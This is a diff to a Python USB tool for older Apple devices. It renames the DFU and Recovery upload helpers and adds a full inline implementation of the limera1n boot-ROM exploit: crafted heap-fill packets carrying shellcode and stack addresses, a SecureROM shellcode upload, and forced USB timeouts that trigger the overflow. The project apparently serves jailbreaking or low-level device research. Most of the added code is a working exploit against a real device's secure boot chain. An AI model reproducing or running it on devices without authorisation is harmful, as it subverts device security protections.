@@ -1,4 +1,5 @@
 import shutil
+import struct
 import subprocess
 import tempfile
 import time
@@ -55,21 +56,28 @@ class Device:
         data = path.read_bytes()
         match self.mode:
             case DeviceMode.DFU:
-                self._upload_data_dfu(data)
+                self._dfu_upload_data(data)
+                # For DFU devices, immediately ask the device to validate the file.
+                self._dfu_notify_upload_finished()
             case DeviceMode.Recovery:
-                self._upload_data_recovery(data)
+                self._recovery_upload_data(data)
+                # For Recovery Mode devices, the logic to notify the device that the upload is ready will differ
+                # depending on what the image is for, so allow them to deal with it.
 
     def send_command(self, command: str) -> None:
         if self.mode != DeviceMode.Recovery:
             raise ValueError(f"Sending commands is only supported in Recovery Mode")
         self.handle.ctrl_transfer(0x40, 0, data_or_wLength=command.encode() + b'\x00', timeout=30000)
 
-    def _upload_data_dfu(self, data: bytes) -> None:
+    def _dfu_upload_data(self, data: bytes, timeout_ms: int = 3000) -> None:
         max_dfu_upload_chunk_size = 0x800
         for chunk in chunks(data, max_dfu_upload_chunk_size):
             print(f'Uploading chunk of {len(chunk)} bytes...')
-            ret = self.handle.ctrl_transfer(0x21, 1, 0, 0, chunk, 3000)
-            print(f'\tret {ret}')
+            sent_bytes_count = self.handle.ctrl_transfer(0x21, 1, 0, 0, chunk, timeout_ms)
+            if sent_bytes_count != len(chunk):
+                raise ValueError(f'Expected to transfer {len(chunk)} bytes, but only managed to send {sent_bytes_count} bytes')
+
+    def _dfu_notify_upload_finished(self) -> None:
         print(f'Informing the DFU device that the upload has finished...')
         self.handle.ctrl_transfer(0x21, 1, 0, 0, 0, timeout=100)
         # Send a 'Get Status' three times
@@ -85,11 +93,11 @@ class Device:
             # Sometimes this throws an error, but the image load starts anyway
             pass
 
-    def _upload_data_recovery(self, data):
+    def _recovery_upload_data(self, file_data: bytes) -> None:
         max_recovery_upload_chunk_size = 0x4000
         if self.handle.ctrl_transfer(0x41, 0, 0, timeout=1000) != 0:
             raise ValueError(f'Expected a response of 0')
-        for chunk in chunks(data, max_recovery_upload_chunk_size):
+        for chunk in chunks(file_data, max_recovery_upload_chunk_size):
             print(f'Uploading chunk of {len(chunk)} bytes...')
             wrote_bytes = self.handle.write(0x04, chunk, timeout=1000)
             if wrote_bytes != len(chunk):
@@ -154,21 +162,77 @@ def exploit_and_upload_image(image_path: Path):
         if not maybe_dfu_device:
             print('No DFU-mode device detected, will not run exploit or upload image')
             return
+        device = maybe_dfu_device
 
         print(f'Running exploit because we detected a DFU-mode device')
 
-        # Only bother recompiling the payload just before we send the exploit
-        jailbreak_folder = Path(__file__).parent / "jailbreak"
-        jailbreak_build_folder = jailbreak_folder / "build"
-        jailbreak_build_folder.mkdir(exist_ok=True)
-        recompile_exploit_runner(jailbreak_folder)
-        jailbreak_binary = jailbreak_build_folder / "jailbreak"
+        # Run limera1n
+        RECV_IMAGE_BUFFER_BASE = 0x84000000
+        RECV_IMAGE_BUFFER_SIZE = 0x2c000
+        FOUR_K_PAGE = 0x1000
+        DFU_MAX_PACKET_SIZE = 0x800
+        stack_addr = 0x8403BF9C
+        # Add 1 so the shellcode executes in Thumb
+        shellcode_addr = RECV_IMAGE_BUFFER_BASE + RECV_IMAGE_BUFFER_SIZE - FOUR_K_PAGE + 1
+        print(f'shellcode_addr {hex(shellcode_addr)}')
 
-        proc: subprocess.CompletedProcess = subprocess.run(jailbreak_binary.as_posix())
-        if proc.returncode != 0:
-            raise ValueError(f"Jailbreak runner exited with code {proc.returncode}")
+        load_region_buf = bytearray([0 for _ in range(RECV_IMAGE_BUFFER_SIZE)])
+        load_region_buf[0:DFU_MAX_PACKET_SIZE] = [0xcc for _ in range(DFU_MAX_PACKET_SIZE)]
+        for i in range(0, DFU_MAX_PACKET_SIZE, 0x40):
+            struct.pack_into("<I", load_region_buf, i + 0, 0x405)
+            struct.pack_into("<I", load_region_buf, i + 4, 0x101)
+            struct.pack_into("<I", load_region_buf, i + 8, shellcode_addr)
+            struct.pack_into("<I", load_region_buf, i + 12, stack_addr)
 
-    # Give it a chance to run
+        # Send the heap fill
+        # (This one includes the jump addr)
+        print('Sending heap fill')
+        device._dfu_upload_data(load_region_buf[0:DFU_MAX_PACKET_SIZE])
+
+        # Fill the heap even more?!
+        print('Filling the heap some more')
+        load_region_buf[0:DFU_MAX_PACKET_SIZE] = [0xcc for _ in range(DFU_MAX_PACKET_SIZE)]
+        #dfu_packet_buf = bytearray([0xcc for _ in range(DFU_MAX_PACKET_SIZE)])
+        for i in range(0, RECV_IMAGE_BUFFER_SIZE - 0x1800, DFU_MAX_PACKET_SIZE):
+            device._dfu_upload_data(load_region_buf[0:DFU_MAX_PACKET_SIZE])
+
+        print('Sending shellcode')
+        securerom_shellcode_path = Path(__file__).parent / "payload_stage1" / "build" / "payload_stage1_shellcode"
+        securerom_shellcode = securerom_shellcode_path.read_bytes()
+        print(f'SecureROM shellcode length: {len(securerom_shellcode)}')
+        device._dfu_upload_data(securerom_shellcode)
+
+        # This might be a heap fill?
+        dfu_packet_buf = bytearray([0xbb for _ in range(DFU_MAX_PACKET_SIZE)])
+        device.handle.ctrl_transfer(0xa1, 1, 0, 0, dfu_packet_buf, 1000)
+
+        print('Sending arbitrary data to force a timeout')
+        class ExpectedUsbTimeout(Exception):
+            pass
+        try:
+            device._dfu_upload_data(dfu_packet_buf, timeout_ms=10)
+            raise ExpectedUsbTimeout()
+        except usb.core.USBTimeoutError:
+            # Expected/desired here
+            pass
+
+        # This should fail too
+        try:
+            device.handle.ctrl_transfer(0x21, 2, 0, 0, dfu_packet_buf, 10)
+            raise ExpectedUsbTimeout()
+        except usb.core.USBTimeoutError:
+            # Expected/desired here
+            pass
+        print(f'Sent exploit to overflow heap')
+
+        # Reset the device and inform it there's a file ready to be processed
+        device.handle.reset()
+        device._dfu_notify_upload_finished()
+        with acquire_device(DeviceMode.DFU):
+            print('Device reconnected limera1n exploit successful')
+        usb.util.dispose_resources(device.handle)
+
+    # Give the on-device payload a chance to run
     time.sleep(3)
 
     # Re-acquire the device as our previous connection is invalidated after running the exploit
